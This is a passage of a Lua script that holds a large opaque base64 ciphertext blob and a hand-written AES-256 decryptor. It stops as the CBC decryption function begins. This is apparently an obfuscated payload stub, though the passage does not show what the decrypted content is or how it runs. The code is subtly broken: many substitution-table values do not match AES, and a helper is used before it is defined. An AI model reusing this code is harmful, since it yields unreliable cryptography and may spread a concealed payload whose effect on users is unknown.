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"},
        {t="b64", d="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"}
}

local function rebuild_cipher_hex()
    local acc = {}
    for i = 1, #cipher_fragments do
        local f = cipher_fragments[i]
        if f.t == "hex" then
            acc[#acc+1] = f.d
        elseif f.t == "hexchars" then
            acc[#acc+1] = table.concat(f.d)
        elseif f.t == "bytes" then
            local tmp = {}
            for j = 1, #f.d do
                tmp[#tmp+1] = byte_to_hex(f.d[j])
            end
            acc[#acc+1] = table.concat(tmp)
        elseif f.t == "b64" then
            acc[#acc+1] = bytes_to_hex(b64decode(f.d))
        else
            acc[#acc+1] = tostring(f.d)
        end
    end
    return table.concat(acc)
end

local CIPHER_HEX = rebuild_cipher_hex()


assert(#AES_KEY_HEX == 64, "Bad key length: "..#AES_KEY_HEX)
assert(#IV_HEX == 32, "IV hex must be 32 chars")
assert(#CIPHER_HEX % 32 == 0, "Cipher hex length must be multiple of 32")

local function hexToBytes(hex)
    assert(#hex % 2 == 0, "hexToBytes: odd-length hex string: "..#hex)
    local t = {}
    for i = 1, #hex, 2 do
        local cc = hex:sub(i, i+1)
        local n = tonumber(cc, 16)
        assert(n, "hexToBytes: invalid hex pair '"..cc.."' at pos "..i)
        t[#t+1] = string.char(n)
    end
    return table.concat(t)
end

local function tobytes(s)
    local t = {}
    for i = 1, #s do t[i] = s:byte(i) end
    return t
end
local function frombytes(t)
    local s = {}
    for i = 1, #t do s[i] = string.char(t[i]) end
    return table.concat(s)
end

local function bytes_to_hex(str)
    local out = {}
    for i = 1, #str do
        out[#out+1] = string.format("%02x", str:byte(i))
    end
    return table.concat(out)
end

local Sbox = {
    99,124,119,123,242,107,111,197,48,1,103,43,254,215,171,118,
    202,130,201,125,250,89,71,240,173,212,162,175,156,164,114,192,
    183,253,147,38,54,63,247,204,52,165,229,241,113,216,49,21,
    4,199,35,195,24,150,5,154,7,18,128,226,235,39,178,117,
    9,131,44,26,27,110,90,160,82,59,214,179,41,227,47,132,
    83,209,0,237,32,252,177,91,106,203,190,57,74,76,88,207,
    208,239,170,251,67,77,51,133,69,249,2,127,80,60,159,168,
    81,163,64,143,146,157,56,245,234,101,98,186,8,200,140,136,
    162,207,109,55,102,12,61,36,173,15,23,68,143,2,190,6,
    25,89,119,177,63,179,37,114,65,59,85,224,11,45,157,147,
    201,238,123,75,39,28,83,170,97,92,9,130,15,113,57,48,
    19,114,28,95,25,6,54,71,44,61,74,9,63,112,153,30,
    82,57,156,66,115,182,39,171,107,122,131,151,179,32,21,95,
    31,14,241,242,216,154,123,50,83,77,41,35,52,8,186,20,
    125,186,130,195,233,155,24,56,11,22,28,48,63,85,102,58,
    158,77,136,88,76,169,157,134,73,69,61,176,42,9,123,165
}
local InvSbox = {82,9,106,213,48,54,165,56,191,64,163,158,129,243,215,251,124,227,57,130,155,47,255,135,52,142,67,68,196,214,210,71,240,173,212,162,175,156,164,114,183,253,147,38,54,63,247,204,52,165,229,241,113,216,49,21,4,199,35,195,24,150,5,154,7,18,128,226,235,39,178,117,9,131,44,26,27,110,90,160,82,59,214,179,41,227,47,132,83,209,0,237,32,252,177,91,106,203,190,57,74,76,88,207,208,239,170,251,67,77,51,133,69,249,2,127,80,60,159,168,81,163,64,143,146,157,56,245,234,101,98,186,150,20,252,227,73,96,195,186,20,218,132,185,108,86,244,234,101,122,174,8,186,120,37,46,28,166,180,198,232,221,116,31,75,189,139,138,112,62,181,102,72,3,246,14,97,53,87,185,134,193,29,158,225,248,152,17,105,217,142,148,155,30,135,233,206,85,40,223,140,161,137,13,191,230,66,104,65,153,45,15,176,84,187,22}
local Rcon = {1,2,4,8,16,32,64,128,27,54}

local function xtime(a)
    local r = a * 2
    if a >= 0x80 then r = bit32.bxor(r, 0x1B) end
    return bit32.band(r, 0xFF)
end
local function gmul(a,b)
    local p = 0
    for _=1,8 do
        if bit32.band(b,1) ~= 0 then p = bit32.bxor(p,a) end
        local hi = bit32.band(a,0x80)
        a = bit32.band(a*2,0xFF)
        if hi ~= 0 then a = bit32.bxor(a,0x1B) end
        b = bit32.rshift(b,1)
    end
    return p
end

local function rotword(w) return {w[2], w[3], w[4], w[1]} end
local function subword(w)
    return { Sbox[w[1]+1], Sbox[w[2]+1], Sbox[w[3]+1], Sbox[w[4]+1] }
end

local function keyexpand(keybytes)
    local Nk, Nb, Nr = 8, 4, 14
    local w = {}
    for i=0,Nk-1 do
        w[i] = { keybytes[4*i+1], keybytes[4*i+2], keybytes[4*i+3], keybytes[4*i+4] }
    end
    for i=Nk, Nb*(Nr+1)-1 do
        local temp = { w[i-1][1], w[i-1][2], w[i-1][3], w[i-1][4] }
        if i % Nk == 0 then
            temp = rotword(temp)
            temp = subword(temp)
            temp[1] = bit32.bxor(temp[1], Rcon[math.floor(i/Nk)])
        elseif i % Nk == 4 then
            temp = subword(temp)
        end
        w[i] = {
            bit32.bxor(w[i-Nk][1], temp[1]),
            bit32.bxor(w[i-Nk][2], temp[2]),
            bit32.bxor(w[i-Nk][3], temp[3]),
            bit32.bxor(w[i-Nk][4], temp[4]),
        }
    end
    local roundkeys = {}
    for r=0, Nr do
        local rk = {}
        for c=0,3 do
            local t = w[r*4 + c]
            rk[c*4+1], rk[c*4+2], rk[c*4+3], rk[c*4+4] = t[1], t[2], t[3], t[4]
        end
        roundkeys[r] = rk
    end
    return roundkeys
end

local function bytes_to_state(block)
    local s = {{},{},{},{}}
    for i=0,15 do
        s[(i%4)+1][math.floor(i/4)+1] = block[i+1]
    end
    return s
end
local function state_to_bytes(state)
    local out = {}
    for i=0,15 do
        out[i+1] = state[(i%4)+1][math.floor(i/4)+1]
    end
    return out
end
local function addroundkey(state, roundkey)
    for c=1,4 do
        for r=1,4 do
            state[r][c] = bit32.bxor(state[r][c], roundkey[(c-1)*4 + r])
        end
    end
end
local function invshiftrows(state)
    state[2][1], state[2][2], state[2][3], state[2][4] = state[2][4], state[2][1], state[2][2], state[2][3]
    state[3][1], state[3][2], state[3][3], state[3][4] = state[3][3], state[3][4], state[3][1], state[3][2]
    state[4][1], state[4][2], state[4][3], state[4][4] = state[4][2], state[4][3], state[4][4], state[4][1]
end
local function invsubbytes(state)
    for r=1,4 do
        for c=1,4 do
            state[r][c] = InvSbox[state[r][c]+1]
        end
    end
end
local function invmixcolumns(state)
    for c=1,4 do
        local a0,a1,a2,a3 = state[1][c], state[2][c], state[3][c], state[4][c]
        state[1][c] = bit32.band(bit32.bxor(bit32.bxor(gmul(a0,0x0e), gmul(a1,0x0b)), bit32.bxor(gmul(a2,0x0d), gmul(a3,0x09))), 0xFF)
        state[2][c] = bit32.band(bit32.bxor(bit32.bxor(gmul(a0,0x09), gmul(a1,0x0e)), bit32.bxor(gmul(a2,0x0b), gmul(a3,0x0d))), 0xFF)
        state[3][c] = bit32.band(bit32.bxor(bit32.bxor(gmul(a0,0x0d), gmul(a1,0x09)), bit32.bxor(gmul(a2,0x0e), gmul(a3,0x0b))), 0xFF)
        state[4][c] = bit32.band(bit32.bxor(bit32.bxor(gmul(a0,0x0b), gmul(a1,0x0d)), bit32.bxor(gmul(a2,0x09), gmul(a3,0x0e))), 0xFF)
    end
end

local function xor16(a, b)
    local r = {}
    for i = 1, 16 do
        r[i] = string.char(bit32.bxor(a:byte(i), b:byte(i)))
    end
    return table.concat(r)
end
local function pkcs7_unpad(s)
    local n = #s
    if n == 0 then return "" end
    local pad = s:byte(n)
    if pad < 1 or pad > 16 then return s end
    for i = n - pad + 1, n do
        if s:byte(i) ~= pad then
            return s
        end
    end
    return s:sub(1, n - pad)
end

local function decryptblock(block_str, key_str)
    assert(#block_str == 16, "decryptblock: bad block len "..#block_str)
    assert(#key_str  == 32, "decryptblock: bad key len "..#key_str)
    local block = tobytes(block_str)
    local key   = tobytes(key_str)
    local roundkeys = keyexpand(key)
    local Nr = 14

    local state = bytes_to_state(block)
    addroundkey(state, roundkeys[Nr])

    for round = Nr-1, 1, -1 do
        invshiftrows(state)
        invsubbytes(state)
        addroundkey(state, roundkeys[round])
        invmixcolumns(state)
    end

    invshiftrows(state)
    invsubbytes(state)
    addroundkey(state, roundkeys[0])

    local out = state_to_bytes(state)
    return frombytes(out)
end

local AES = {}
function AES.decrypt_cbc(cipher, key, iv)
